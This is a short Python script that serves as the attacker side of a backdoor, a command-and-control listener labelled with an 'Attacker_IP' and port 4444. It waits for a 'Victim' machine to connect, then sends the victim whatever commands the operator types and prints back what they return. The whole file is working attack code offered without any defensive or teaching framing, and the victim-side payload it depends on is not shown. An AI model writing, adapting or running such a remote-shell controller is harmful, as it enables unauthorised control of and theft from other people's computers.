import socket

Attacker_IP = '192.168.33.174'
PORT = 4444

server = socket.socket()
server.bind((Attacker_IP, PORT))
print('Server Created!')
print('Listening...')
server.listen(1)

Victim, Victim_IP = server.accept()
print('Victim opened the backdoor! IP: ' + Victim_IP[0])

while True:
    command = input('Enter Command : ')
    command = command.encode()
    Victim.send(command)
    print('Command sent to ' + Victim_IP[0])
    
    output = Victim.recv(1024)
    output = output.decode()
    print("Output: " + output) 
